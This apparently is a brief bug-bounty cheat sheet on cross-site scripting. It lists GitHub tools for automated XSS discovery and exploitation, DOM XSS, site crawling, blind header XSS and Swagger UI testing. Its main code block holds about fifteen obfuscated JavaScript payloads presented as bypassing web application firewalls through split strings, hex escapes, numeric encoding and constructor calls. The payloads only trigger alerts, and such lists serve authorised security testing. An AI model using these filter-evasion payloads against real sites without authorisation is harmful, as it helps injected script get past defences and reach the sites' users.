> 1. XSS automatic detection and exploit
```
https://github.com/garlic0x1/go-reflect
https://github.com/Encryptor-Sec/XSSearch
https://github.com/theinfosecguy/QuickXSS
```

> 2. DOMXSS Find and Exploit
```
https://github.com/edoardottt/lit-bb-hack-tools/tree/main/doomxss
```
> 3.Crawl entire website for xss parameter
```
https://github.com/thenurhabib/collector
https://github.com/Qianlitp/crawlergo
```
> 4. Testing blind xss via headers using xsshunter
```
https://github.com/muhamadkarkuki/xssHeaders
```
> Some XSS Payloads which bypasses the WAF
```
[%27al\x65rt%27](document.domain);//
window[‘alert’](0)
parent[‘alert’](1)
self[‘alert’](2)
top[‘alert’](3)
this[‘alert’](4)
frames[‘alert’](5)
content[‘alert’](6)
constructor.constructor(“aler”+”t(3)”)();
[].filter.constructor(‘ale’+’rt(4)’)();
top[“al”+”ert”](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top[‘al\x65rt’](9);
foo%27-top[%27al\x65rt%27](document.domain);//
```
> Swagger UI XSS Testing Automation
```
https://github.com/Nightmre/swAPI-XSS
```
